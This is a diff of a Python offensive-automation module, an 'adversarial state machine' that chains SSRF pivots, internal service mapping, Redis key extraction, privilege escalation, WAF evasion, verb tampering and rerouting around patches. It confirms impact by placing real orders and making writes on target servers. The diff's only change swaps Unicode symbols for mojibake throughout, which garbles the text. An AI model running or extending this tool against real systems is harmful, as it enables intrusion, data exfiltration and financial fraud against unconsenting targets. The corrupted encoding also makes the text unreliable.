@@ -1,19 +1,19 @@
-"""
-MSE Adversarial Reasoning Engine — State Machine
+﻿"""
+MSE Adversarial Reasoning Engine â€” State Machine
 ==================================================
 Elite Red Team logic layer that sits on top of the Decision Tree.
 Implements a Finite State Machine where each transition depends on
 the success of the previous state, guaranteeing surgical exploitation.
 
 Architecture:
-  SniperState (Enum)           → FSM states
-  CostRewardCalculator         → Prioritizes targets by exploitation depth
-  PolymorphicPayloadEngine     → Mutates payloads when WAF blocks N/N probes
-  PrivilegeEscalationModule    → Uses leaked data to attempt priv-esc
-  IncidentValidator            → Confirms real-world impact (order IDs, write ops)
-  DriftRecalibrator            → Detects patching, reroutes via subdomains
-  ExploitChain                 → Linked chain where each step feeds the next
-  AdversarialStateMachine      → Core FSM orchestrator
+  SniperState (Enum)           â†’ FSM states
+  CostRewardCalculator         â†’ Prioritizes targets by exploitation depth
+  PolymorphicPayloadEngine     â†’ Mutates payloads when WAF blocks N/N probes
+  PrivilegeEscalationModule    â†’ Uses leaked data to attempt priv-esc
+  IncidentValidator            â†’ Confirms real-world impact (order IDs, write ops)
+  DriftRecalibrator            â†’ Detects patching, reroutes via subdomains
+  ExploitChain                 â†’ Linked chain where each step feeds the next
+  AdversarialStateMachine      â†’ Core FSM orchestrator
 """
 
 import asyncio
@@ -221,61 +221,61 @@ CORRELATION_EDGE_RULES = [
         "name": "Source Code + Admin Endpoint",
         "requires": ["source_code_access", "admin_endpoint"],
         "bonus": 2.5,
-        "reasoning": "GitHub/GitLab token + admin endpoint → clone repo for .env credentials",
+        "reasoning": "GitHub/GitLab token + admin endpoint â†’ clone repo for .env credentials",
     },
     {
         "name": "Cloud Credential + SSRF Vector",
         "requires": ["cloud_credential", "ssrf_vector"],
         "bonus": 3.0,
-        "reasoning": "Cloud key + SSRF → metadata escalation to full IAM takeover",
+        "reasoning": "Cloud key + SSRF â†’ metadata escalation to full IAM takeover",
     },
     {
         "name": "DB Access + Credential Leak",
         "requires": ["db_direct_access", "credential_reuse"],
         "bonus": 2.0,
-        "reasoning": "DB connection + leaked password → direct database exfiltration",
+        "reasoning": "DB connection + leaked password â†’ direct database exfiltration",
     },
     {
         "name": "Session Hijack + Auth Bypass",
         "requires": ["session_hijack", "auth_bypass"],
         "bonus": 2.5,
-        "reasoning": "JWT/session token + broken auth → silent privilege escalation",
+        "reasoning": "JWT/session token + broken auth â†’ silent privilege escalation",
     },
     {
         "name": "Token Forge + Admin Access",
         "requires": ["token_forge", "admin_access"],
         "bonus": 3.0,
-        "reasoning": "JWT secret exposed + admin panel → forge admin tokens",
+        "reasoning": "JWT secret exposed + admin panel â†’ forge admin tokens",
     },
     {
         "name": "Payment Compromise + Financial Theft",
         "requires": ["payment_compromise"],
         "bonus": 2.0,
-        "reasoning": "Stripe/payment key exposed → direct financial fraud",
+        "reasoning": "Stripe/payment key exposed â†’ direct financial fraud",
     },
     {
         "name": "CI/CD Pivot + Source Code",
         "requires": ["ci_cd_pivot", "source_code_access"],
         "bonus": 2.0,
-        "reasoning": "CI/CD access + source → supply chain compromise",
+        "reasoning": "CI/CD access + source â†’ supply chain compromise",
     },
     {
         "name": "NoSQL Backend + Broken Auth",
         "requires": ["nosql_backend", "broken_auth_vector"],
         "bonus": 2.5,
-        "reasoning": "Firebase/Mongo + weak auth → operator injection bypass",
+        "reasoning": "Firebase/Mongo + weak auth â†’ operator injection bypass",
     },
     {
         "name": "Full DB Compromise",
         "requires": ["full_db_compromise"],
         "bonus": 3.0,
-        "reasoning": "Full DB connection string exposed → immediate data exfiltration",
+        "reasoning": "Full DB connection string exposed â†’ immediate data exfiltration",
     },
     {
         "name": "Crypto + Session Forge",
         "requires": ["crypto_compromise", "session_forge"],
         "bonus": 2.5,
-        "reasoning": "Encryption/signing key + session secret → forge any session",
+        "reasoning": "Encryption/signing key + session secret â†’ forge any session",
     },
 ]
 
@@ -401,17 +401,17 @@ class CostRewardCalculator:
 
         reasons = []
         if vuln_class == VulnClass.SSRF:
-            reasons.append(f"SSRF → infra {infra.detected.value}: credential dump + lateral movement")
+            reasons.append(f"SSRF â†’ infra {infra.detected.value}: credential dump + lateral movement")
         if vuln_class == VulnClass.SQLI:
-            reasons.append("SQLi → data exfiltration + potential RCE via xp_cmdshell/COPY")
+            reasons.append("SQLi â†’ data exfiltration + potential RCE via xp_cmdshell/COPY")
         if vuln_class == VulnClass.ECOMMERCE:
-            reasons.append("E-commerce → financial impact via price/coupon manipulation")
+            reasons.append("E-commerce â†’ financial impact via price/coupon manipulation")
         if vuln_class == VulnClass.COMMAND_INJECTION:
-            reasons.append("CMDi → direct system access, highest severity")
+            reasons.append("CMDi â†’ direct system access, highest severity")
         if crit_count > 0:
             reasons.append(f"{crit_count} CRITICAL findings boost priority")
         if waf_block_rate > 0.7:
-            reasons.append(f"WAF blocking {waf_block_rate:.0%} — polymorphic mutation required")
+            reasons.append(f"WAF blocking {waf_block_rate:.0%} â€” polymorphic mutation required")
         for edge in correlation_edges:
             reasons.append(f"[CORRELATION] {edge['name']}: {edge['reasoning']}")
         if not reasons:
@@ -524,7 +524,7 @@ class PrivilegeEscalationModule:
         if leaked_data.get("redis_confirmed"):
             esc_path_key = "redis_escalation"
             self.log(
-                f"[ESCALATION] Redis connection confirmed — attempting key extraction...",
+                f"[ESCALATION] Redis connection confirmed â€” attempting key extraction...",
                 "error", "adversarial"
             )
 
@@ -533,7 +533,7 @@ class PrivilegeEscalationModule:
 
         paths = ESCALATION_PATHS.get(esc_path_key, [])
         self.log(
-            f"[ESCALATION] Initiating privilege escalation via {esc_path_key} — "
+            f"[ESCALATION] Initiating privilege escalation via {esc_path_key} â€” "
             f"{len(paths)} escalation vectors",
             "error", "adversarial"
         )
@@ -571,7 +571,7 @@ class PrivilegeEscalationModule:
 
                 if hit:
                     self.log(
-                        f"[ESCALATION] ★ PRIVILEGE ESCALATION CONFIRMED: {path_def['name']} "
+                        f"[ESCALATION] â˜… PRIVILEGE ESCALATION CONFIRMED: {path_def['name']} "
                         f"via {ssrf_endpoint}?{ssrf_param}=",
                         "error", "adversarial"
                     )
@@ -596,7 +596,7 @@ class PrivilegeEscalationModule:
                         "status_code": resp.status_code,
                         "response_time_ms": elapsed,
                         "vulnerable": True,
-                        "verdict": f"ESCALATED — {path_def['name']}",
+                        "verdict": f"ESCALATED â€” {path_def['name']}",
                         "severity": "CRITICAL",
                         "description": f"Priv-esc via {esc_path_key}: {path_def['name']}",
                         "payload": target_url,
@@ -614,7 +614,7 @@ class PrivilegeEscalationModule:
     ) -> List[Dict]:
         discovered = []
         self.log(
-            f"[LATERAL] Initiating internal service mapping — "
+            f"[LATERAL] Initiating internal service mapping â€” "
             f"{len(INTERNAL_SERVICE_MAP)} services to probe...",
             "error", "adversarial"
         )
@@ -638,8 +638,8 @@ class PrivilegeEscalationModule:
                     }
                     discovered.append(entry)
                     self.log(
-                        f"[LATERAL] ★ Internal service discovered: {svc['name']} "
-                        f"(port {svc['port']}) — responding via SSRF",
+                        f"[LATERAL] â˜… Internal service discovered: {svc['name']} "
+                        f"(port {svc['port']}) â€” responding via SSRF",
                         "error", "adversarial"
                     )
                     self.add_finding({
@@ -660,7 +660,7 @@ class PrivilegeEscalationModule:
 
         if discovered:
             self.log(
-                f"[LATERAL] Internal mapping complete — {len(discovered)}/{len(INTERNAL_SERVICE_MAP)} "
+                f"[LATERAL] Internal mapping complete â€” {len(discovered)}/{len(INTERNAL_SERVICE_MAP)} "
                 f"services accessible via SSRF",
                 "error", "adversarial"
             )
@@ -711,7 +711,7 @@ class IncidentValidator:
             incident["validated"] = True
             incident["financial_impact"] = True
             self.log(
-                f"[INCIDENT] ★★ REAL INCIDENT CONFIRMED: Order {incident['order_id']} created "
+                f"[INCIDENT] â˜…â˜… REAL INCIDENT CONFIRMED: Order {incident['order_id']} created "
                 f"via {exploit_result.technique} at {exploit_result.target_endpoint}",
                 "error", "adversarial"
             )
@@ -737,7 +737,7 @@ class IncidentValidator:
                 incident["validated"] = True
                 self.log(
                     f"[INCIDENT] Price manipulation accepted at {exploit_result.target_endpoint} "
-                    f"— backend confirmed change but no order ID extracted",
+                    f"â€” backend confirmed change but no order ID extracted",
                     "error", "adversarial"
                 )
 
@@ -760,8 +760,8 @@ class IncidentValidator:
             incident["validated"] = True
             incident["resource_modified"] = True
             self.log(
-                f"[INCIDENT] ★★ WRITE CONFIRMED: {exploit_result.method} at "
-                f"{exploit_result.target_endpoint} — resource modified on server",
+                f"[INCIDENT] â˜…â˜… WRITE CONFIRMED: {exploit_result.method} at "
+                f"{exploit_result.target_endpoint} â€” resource modified on server",
                 "error", "adversarial"
             )
             self.add_finding({
@@ -874,7 +874,7 @@ class DriftRecalibrator:
             return None
 
         self.log(
-            f"[DRIFT-VERB] HTTP {blocked_status} at {endpoint} — initiating Verb Tampering: "
+            f"[DRIFT-VERB] HTTP {blocked_status} at {endpoint} â€” initiating Verb Tampering: "
             f"testing {', '.join(self.VERB_TAMPER_METHODS)}",
             "error", "adversarial"
         )
@@ -899,7 +899,7 @@ class DriftRecalibrator:
 
                 if resp.status_code < 400:
                     self.log(
-                        f"[DRIFT-VERB] ★ VERB BYPASS: {endpoint} blocked with GET/POST (HTTP {blocked_status}) "
+                        f"[DRIFT-VERB] â˜… VERB BYPASS: {endpoint} blocked with GET/POST (HTTP {blocked_status}) "
                         f"but accepts {method} (HTTP {resp.status_code})",
                         "error", "adversarial"
                     )
@@ -924,7 +924,7 @@ class DriftRecalibrator:
                         "method": method,
                         "status_code": resp.status_code,
                         "vulnerable": True,
-                        "verdict": f"VERB BYPASS — {method} accepted where GET/POST blocked ({blocked_status})",
+                        "verdict": f"VERB BYPASS â€” {method} accepted where GET/POST blocked ({blocked_status})",
                         "severity": "CRITICAL",
                         "timestamp": _ts(),
                     })
@@ -933,7 +933,7 @@ class DriftRecalibrator:
                     allowed = resp.headers.get("Allow", "")
                     if allowed:
                         self.log(
-                            f"[DRIFT-VERB] {method} → 405 but server disclosed Allow: {allowed}",
+                            f"[DRIFT-VERB] {method} â†’ 405 but server disclosed Allow: {allowed}",
                             "warn", "adversarial"
                         )
                         result["allowed_methods"] = allowed
@@ -942,7 +942,7 @@ class DriftRecalibrator:
                 pass
 
         self.log(
-            f"[DRIFT-VERB] No verb bypass found for {endpoint} — all methods blocked/rejected",
+            f"[DRIFT-VERB] No verb bypass found for {endpoint} â€” all methods blocked/rejected",
             "warn", "adversarial"
         )
         return None
@@ -953,7 +953,7 @@ class DriftRecalibrator:
         findings: List[Dict],
     ) -> Optional[Dict]:
         self.log(
-            f"[DRIFT-AUTH] Direct path {blocked_endpoint} blocked — "
+            f"[DRIFT-AUTH] Direct path {blocked_endpoint} blocked â€” "
             f"scanning Source Map + JS Secrets for real auth API endpoint...",
             "error", "adversarial"
         )
@@ -1002,8 +1002,8 @@ class DriftRecalibrator:
                     self.api_auth_discoveries.append(discovery)
 
                     self.log(
-                        f"[DRIFT-AUTH] ★ REAL AUTH ENDPOINT DISCOVERED: {candidate} "
-                        f"(HTTP {resp.status_code}) — {blocked_endpoint} was a frontend facade, "
+                        f"[DRIFT-AUTH] â˜… REAL AUTH ENDPOINT DISCOVERED: {candidate} "
+                        f"(HTTP {resp.status_code}) â€” {blocked_endpoint} was a frontend facade, "
                         f"API processes auth at {candidate}",
                         "error", "adversarial"
                     )
@@ -1028,7 +1028,7 @@ class DriftRecalibrator:
                         "method": "POST",
                         "status_code": resp.status_code,
                         "vulnerable": True,
-                        "verdict": f"AUTH ENDPOINT at {candidate} — {blocked_endpoint} was facade",
+                        "verdict": f"AUTH ENDPOINT at {candidate} â€” {blocked_endpoint} was facade",
                         "severity": "HIGH",
                         "timestamp": _ts(),
                     })
@@ -1053,7 +1053,7 @@ class DriftRecalibrator:
             return None
 
         self.log(
-            f"[DRIFT-SSRF] External access to {endpoint} blocked — "
+            f"[DRIFT-SSRF] External access to {endpoint} blocked â€” "
             f"attempting internal POST via {len(ssrf_channels)} SSRF channels "
             f"(internal requests bypass external WAF/firewall rules)",
             "error", "adversarial"
@@ -1093,12 +1093,12 @@ class DriftRecalibrator:
 
                 if resp.status_code < 400:
                     self.log(
-                        f"[DRIFT-SSRF] ★ INTERNAL BYPASS: {endpoint} accessible via SSRF through {ssrf_ep} "
-                        f"(HTTP {resp.status_code}) — WAF/firewall rules bypassed on internal network",
+                        f"[DRIFT-SSRF] â˜… INTERNAL BYPASS: {endpoint} accessible via SSRF through {ssrf_ep} "
+                        f"(HTTP {resp.status_code}) â€” WAF/firewall rules bypassed on internal network",
                         "error", "adversarial"
                     )
                     self.add_finding({
-                        "title": f"WAF Bypass: Internal POST via SSRF at {ssrf_ep} → {endpoint}",
+                        "title": f"WAF Bypass: Internal POST via SSRF at {ssrf_ep} â†’ {endpoint}",
                         "description": (
                             f"External access to {endpoint} was blocked by WAF. "
                             f"Drift Recalibrator routed the POST through confirmed SSRF channel at {ssrf_ep}?{ssrf_param}= "
@@ -1114,11 +1114,11 @@ class DriftRecalibrator:
                     self.add_probe({
                         "probe_type": "SSRF_INTERNAL_POST",
                         "target": self.base_url,
-                        "endpoint": f"{ssrf_ep} → {endpoint}",
+                        "endpoint": f"{ssrf_ep} â†’ {endpoint}",
                         "method": "POST",
                         "status_code": resp.status_code,
                         "vulnerable": True,
-                        "verdict": f"INTERNAL BYPASS — POST via SSRF channel bypasses WAF",
+                        "verdict": f"INTERNAL BYPASS â€” POST via SSRF channel bypasses WAF",
                         "severity": "CRITICAL",
                         "timestamp": _ts(),
                     })
@@ -1147,8 +1147,8 @@ class DriftRecalibrator:
             return None
 
         self.log(
-            f"[DRIFT] ★ PATCHING DETECTED: {endpoint} changed from "
-            f"HTTP {original_status} → {current_status} during operation",
+            f"[DRIFT] â˜… PATCHING DETECTED: {endpoint} changed from "
+            f"HTTP {original_status} â†’ {current_status} during operation",
             "error", "adversarial"
         )
 
@@ -1264,8 +1264,8 @@ class DriftRecalibrator:
                     patch_event["alternative_route"] = alt_url
 
                     self.log(
-                        f"[DRIFT] ★ RECALIBRATED: {endpoint} → {alt_host} "
-                        f"(HTTP {resp.status_code}) — Endpoint still accessible via alternative host",
+                        f"[DRIFT] â˜… RECALIBRATED: {endpoint} â†’ {alt_host} "
+                        f"(HTTP {resp.status_code}) â€” Endpoint still accessible via alternative host",
                         "error", "adversarial"
                     )
 
@@ -1284,7 +1284,7 @@ class DriftRecalibrator:
                 pass
 
         self.log(
-            f"[DRIFT] No alternative routes found for {endpoint} — endpoint appears fully patched",
+            f"[DRIFT] No alternative routes found for {endpoint} â€” endpoint appears fully patched",
             "warn", "adversarial"
         )
         return None
@@ -1385,7 +1385,7 @@ class AdversarialStateMachine:
         )
         self.transitions.append(t)
         self.log(
-            f"[FSM] {self.current_state.value} → {new_state.value} | {condition}",
+            f"[FSM] {self.current_state.value} â†’ {new_state.value} | {condition}",
             "warn", "adversarial"
         )
         self.current_state = new_state
@@ -1410,7 +1410,7 @@ class AdversarialStateMachine:
 
     async def execute(self) -> Dict:
         self.log(
-            "[FSM] ★ ADVERSARIAL STATE MACHINE INITIALIZED — "
+            "[FSM] â˜… ADVERSARIAL STATE MACHINE INITIALIZED â€” "
             "Entering zero-knowledge exploitation cycle",
             "error", "adversarial"
         )
@@ -1431,13 +1431,13 @@ class AdversarialStateMachine:
             if waf_rate >= 0.85:
                 self._transition(
                     SniperState.POLYMORPHIC_MUTATION,
-                    f"WAF blocking {waf_rate:.0%} — switching to polymorphic payloads",
+                    f"WAF blocking {waf_rate:.0%} â€” switching to polymorphic payloads",
                 )
                 await self._state_polymorphic_attack(priority)
             else:
                 self._transition(
                     SniperState.EXPLOITATION,
-                    f"Standard exploitation — WAF rate {waf_rate:.0%}",
+                    f"Standard exploitation â€” WAF rate {waf_rate:.0%}",
                 )
                 await self._state_standard_exploitation(priority)
 
@@ -1450,7 +1450,7 @@ class AdversarialStateMachine:
             self._transition(SniperState.INCIDENT_VALIDATION, "Validating real-world impact")
             await self._state_incident_validation(priority)
 
-        self._transition(SniperState.TELEMETRY, "All chains processed — compiling report")
+        self._transition(SniperState.TELEMETRY, "All chains processed â€” compiling report")
         return self._build_report()
 
     async def _state_surface_analysis(self):
@@ -1488,9 +1488,9 @@ class AdversarialStateMachine:
         self.log("[PRIORITY] Target execution order (highest value first):", "warn", "adversarial")
         for i, p in enumerate(self.priorities):
             self.log(
-                f"[PRIORITY] #{i+1} {p.vuln_class.value.upper()} — "
+                f"[PRIORITY] #{i+1} {p.vuln_class.value.upper()} â€” "
                 f"ratio={p.ratio} depth={p.depth_potential} "
-                f"({'★ HIGH VALUE' if p.ratio > 3 else '◆ STANDARD'})",
+                f"({'â˜… HIGH VALUE' if p.ratio > 3 else 'â—† STANDARD'})",
                 "error" if p.ratio > 3 else "warn", "adversarial"
             )
 
@@ -1552,7 +1552,7 @@ class AdversarialStateMachine:
         if new_waf_rate >= 0.85 and len(blocked) >= 5:
             self.log(
                 f"[EXPLOIT] WAF escalation: {vuln_class.value.upper()} now at {new_waf_rate:.0%} block rate "
-                f"— triggering polymorphic mutation fallback with evasion tactics",
+                f"â€” triggering polymorphic mutation fallback with evasion tactics",
                 "error", "adversarial"
             )
             self._transition(
@@ -1564,7 +1564,7 @@ class AdversarialStateMachine:
             still_blocked = self._get_waf_block_rate(vuln_class.value) >= 0.85
             if still_blocked and self.confirmed_ssrf_channels and blocked:
                 self.log(
-                    f"[EXPLOIT] Polymorphic evasion failed to reduce WAF block rate — "
+                    f"[EXPLOIT] Polymorphic evasion failed to reduce WAF block rate â€” "
                     f"Hacker Reasoning pivot: routing {vuln_class.value.upper()} through "
                     f"{len(self.confirmed_ssrf_channels)} confirmed SSRF channels (internal bypass)",
                     "error", "adversarial"
@@ -1618,7 +1618,7 @@ class AdversarialStateMachine:
                                 )
                                 self.chain.append(link)
                                 self.log(
-                                    f"[EXPLOIT] ★ {vuln_class.value.upper()} confirmed via adversarial probe "
+                                    f"[EXPLOIT] â˜… {vuln_class.value.upper()} confirmed via adversarial probe "
                                     f"at {endpoint}?{param}=",
                                     "error", "adversarial"
                                 )
@@ -1642,9 +1642,9 @@ class AdversarialStateMachine:
                                     "status_code": resp.status_code,
                                     "response_time_ms": elapsed,
                                     "vulnerable": True,
-                                    "verdict": f"CONFIRMED — {payload_def['name']}",
+                                    "verdict": f"CONFIRMED â€” {payload_def['name']}",
                                     "severity": "CRITICAL" if priority.depth_potential >= 8 else "HIGH",
-                                    "description": f"Adversarial: {vuln_class.value} — {payload_def['name']}",
+                                    "description": f"Adversarial: {vuln_class.value} â€” {payload_def['name']}",
                                     "payload": payload_def["payload"][:100],
                                     "timestamp": _ts(),
                                 })
@@ -1696,7 +1696,7 @@ class AdversarialStateMachine:
             return False
 
         self.log(
-            f"[SSRF-PIVOT] WAF blocked direct access to {blocked_endpoint} — "
+            f"[SSRF-PIVOT] WAF blocked direct access to {blocked_endpoint} â€” "
             f"pivoting through {len(self.confirmed_ssrf_channels)} confirmed SSRF channels",
             "error", "adversarial"
         )
@@ -1724,7 +1724,7 @@ class AdversarialStateMachine:
                         state=SniperState.LATERAL_MOVEMENT,
                         vuln_class=priority.vuln_class.value,
                         technique="ssrf_waf_pivot",
-                        target_endpoint=f"{ssrf_ep}?{ssrf_param}= → {blocked_endpoint}",
+                        target_endpoint=f"{ssrf_ep}?{ssrf_param}= â†’ {blocked_endpoint}",
                         payload=internal_target[:200],
                         status_code=resp.status_code,
                         success=True,
@@ -1734,8 +1734,8 @@ class AdversarialStateMachine:
                     self.chain.append(link)
 
                     self.log(
-                        f"[SSRF-PIVOT] ★ WAF BYPASSED via internal SSRF: {ssrf_ep} → {blocked_endpoint} "
-                        f"(HTTP {resp.status_code}, {elapsed}ms) — internal requests bypass external WAF rules",
+                        f"[SSRF-PIVOT] â˜… WAF BYPASSED via internal SSRF: {ssrf_ep} â†’ {blocked_endpoint} "
+                        f"(HTTP {resp.status_code}, {elapsed}ms) â€” internal requests bypass external WAF rules",
                         "error", "adversarial"
                     )
 
@@ -1757,12 +1757,12 @@ class AdversarialStateMachine:
                     self.add_probe({
                         "probe_type": "SSRF_WAF_PIVOT",
                         "target": self.base_url,
-                        "endpoint": f"{ssrf_ep} → {blocked_endpoint}",
+                        "endpoint": f"{ssrf_ep} â†’ {blocked_endpoint}",
                         "method": "GET",
                         "status_code": resp.status_code,
                         "response_time_ms": elapsed,
                         "vulnerable": True,
-                        "verdict": f"WAF BYPASSED — SSRF internal pivot via {ssrf_ep}",
+                        "verdict": f"WAF BYPASSED â€” SSRF internal pivot via {ssrf_ep}",
                         "severity": "CRITICAL",
                         "timestamp": _ts(),
                     })
@@ -1781,7 +1781,7 @@ class AdversarialStateMachine:
     async def _state_polymorphic_attack(self, priority: TargetPriority):
         vuln_class = priority.vuln_class
         self.log(
-            f"[POLYMORPHIC] WAF resistance detected for {vuln_class.value} — "
+            f"[POLYMORPHIC] WAF resistance detected for {vuln_class.value} â€” "
             f"activating evasion tactics: User-Agent spoofing + Chunked Transfer-Encoding + Unicode normalization",
             "error", "adversarial"
         )
@@ -1844,7 +1844,7 @@ class AdversarialStateMachine:
                                 if consecutive_blocks >= 3 and not ssrf_pivot_attempted:
                                     ssrf_pivot_attempted = True
                                     self.log(
-                                        f"[POLYMORPHIC] {consecutive_blocks} consecutive WAF blocks — "
+                                        f"[POLYMORPHIC] {consecutive_blocks} consecutive WAF blocks â€” "
                                         f"polymorphic evasion insufficient, pivoting to SSRF internal channel",
                                         "error", "adversarial"
                                     )
@@ -1872,7 +1872,7 @@ class AdversarialStateMachine:
                                 )
                                 self.chain.append(link)
                                 self.log(
-                                    f"[POLYMORPHIC] ★ WAF BYPASSED via {mutation.technique} "
+                                    f"[POLYMORPHIC] â˜… WAF BYPASSED via {mutation.technique} "
                                     f"(gen {mutation.generation}, evasion headers active) at {endpoint}?{param}=",
                                     "error", "adversarial"
                                 )
@@ -1900,7 +1900,7 @@ class AdversarialStateMachine:
                                     "status_code": resp.status_code,
                                     "response_time_ms": elapsed,
                                     "vulnerable": True,
-                                    "verdict": f"WAF BYPASSED — {mutation.technique} gen{mutation.generation} + evasion headers",
+                                    "verdict": f"WAF BYPASSED â€” {mutation.technique} gen{mutation.generation} + evasion headers",
                                     "severity": "CRITICAL",
                                     "description": f"Polymorphic: {mutation.technique} + UA spoof + Unicode norm",
                                     "payload": mutation.mutated[:100],
@@ -1959,7 +1959,7 @@ class AdversarialStateMachine:
                     "current_status": result.status_code,
                     "defensibility": "ACTIVE",
                     "interpretation": (
-                        f"Adversarial FSM detected behavioral change on {endpoint} — "
+                        f"Adversarial FSM detected behavioral change on {endpoint} â€” "
                         f"target exhibits active defensibility (response shifted to HTTP {result.status_code}). "
                         f"This indicates real-time patching, WAF rule injection, or adaptive rate-limiting "
                         f"deployed during the assessment window."
@@ -1972,7 +1972,7 @@ class AdversarialStateMachine:
                 if baseline:
                     drift_event["original_status"] = baseline.status_code
                     drift_event["interpretation"] = (
-                        f"Adversarial FSM detected behavioral change on {endpoint} — "
+                        f"Adversarial FSM detected behavioral change on {endpoint} â€” "
                         f"HTTP {baseline.status_code} drifted to HTTP {result.status_code}. "
                         f"Target exhibits active defensibility: real-time patching, WAF rule injection, "
                         f"or adaptive rate-limiting deployed during the assessment window."
@@ -2005,9 +2005,9 @@ class AdversarialStateMachine:
 
                 self.data_drift_events.append(drift_event)
                 self.log(
-                    f"[DRIFT] DATA DRIFT EVENT registered: {endpoint} — "
+                    f"[DRIFT] DATA DRIFT EVENT registered: {endpoint} â€” "
                     f"active defensibility detected | "
-                    f"HTTP {drift_event['original_status']} → {result.status_code} | "
+                    f"HTTP {drift_event['original_status']} â†’ {result.status_code} | "
                     f"recalibrated={drift_event['recalibrated']}",
                     "error", "adversarial"
                 )
@@ -2022,7 +2022,7 @@ class AdversarialStateMachine:
 
             if result.status_code == 405:
                 self.log(
-                    f"[DRIFT] HTTP 405 Method Not Allowed at {endpoint} — "
+                    f"[DRIFT] HTTP 405 Method Not Allowed at {endpoint} â€” "
                     f"probable cause: endpoint requires PUT/PATCH or auth API is at a sub-endpoint. "
                     f"Activating Drift Recalibrator: Verb Tampering + Source Map auth discovery + SSRF pivot",
                     "error", "adversarial"
@@ -2055,7 +2055,7 @@ class AdversarialStateMachine:
                         vuln_class=priority.vuln_class.value,
                         technique="auth_api_discovery",
                         target_endpoint=auth_discovery["real_auth_endpoint"],
-                        payload=f"Facade {endpoint} → real API {auth_discovery['real_auth_endpoint']}",
+                        payload=f"Facade {endpoint} â†’ real API {auth_discovery['real_auth_endpoint']}",
                         status_code=auth_discovery["status_code"],
                         success=True,
                         evidence=auth_discovery.get("body_preview", "")[:200],
@@ -2076,7 +2076,7 @@ class AdversarialStateMachine:
                             state=SniperState.LATERAL_MOVEMENT,
                             vuln_class=priority.vuln_class.value,
                             technique="ssrf_internal_post_bypass",
-                            target_endpoint=f"{ssrf_result['ssrf_channel']} → {endpoint}",
+                            target_endpoint=f"{ssrf_result['ssrf_channel']} â†’ {endpoint}",
                             payload=f"Internal POST via SSRF bypasses external WAF/firewall",
                             status_code=ssrf_result["status_code"],
                             success=True,
@@ -2098,7 +2098,7 @@ class AdversarialStateMachine:
                             vuln_class=priority.vuln_class.value,
                             technique="auth_api_discovery",
                             target_endpoint=auth_discovery["real_auth_endpoint"],
-                            payload=f"WAF blocked {endpoint} → real API {auth_discovery['real_auth_endpoint']}",
+                            payload=f"WAF blocked {endpoint} â†’ real API {auth_discovery['real_auth_endpoint']}",
                             status_code=auth_discovery["status_code"],
                             success=True,
                             evidence=auth_discovery.get("body_preview", "")[:200],
@@ -2119,7 +2119,7 @@ class AdversarialStateMachine:
                                 state=SniperState.LATERAL_MOVEMENT,
                                 vuln_class=priority.vuln_class.value,
                                 technique="ssrf_internal_post_bypass",
-                                target_endpoint=f"{ssrf_result['ssrf_channel']} → {endpoint}",
+                                target_endpoint=f"{ssrf_result['ssrf_channel']} â†’ {endpoint}",
                                 payload=f"Internal POST via SSRF bypasses external WAF/firewall",
                                 status_code=ssrf_result["status_code"],
                                 success=True,
@@ -2156,7 +2156,7 @@ class AdversarialStateMachine:
                 self.confirmed_ssrf_channels.append(channel)
 
                 self.log(
-                    f"[PIVOT] SSRF confirmed at {endpoint}?{param}= — "
+                    f"[PIVOT] SSRF confirmed at {endpoint}?{param}= â€” "
                     f"Initiating internal service mapping ({len(INTERNAL_SERVICE_MAP)} targets)...",
                     "error", "adversarial"
                 )
@@ -2188,7 +2188,7 @@ class AdversarialStateMachine:
                 if redis_svc:
                     leaked["redis_confirmed"] = True
                     self.log(
-                        f"[PIVOT] Redis connection via SSRF established — "
+                        f"[PIVOT] Redis connection via SSRF established â€” "
                         f"attempting key extraction...",
                         "error", "adversarial"
                     )
@@ -2204,7 +2204,7 @@ class AdversarialStateMachine:
 
                 self._transition(
                     SniperState.PRIVILEGE_ESCALATION,
-                    f"Leaked data obtained — attempting escalation via {self.tree.infra.detected.value}",
+                    f"Leaked data obtained â€” attempting escalation via {self.tree.infra.detected.value}",
                 )
                 escalation_results = await self.escalation.attempt_escalation(
                     leaked, self.tree.infra, endpoint, param,
@@ -2343,3 +2343,4 @@ class AdversarialStateMachine:
             "data_drift_events_count": len(self.data_drift_events),
             "active_defensibility_detected": len(self.data_drift_events) > 0,
         }
+
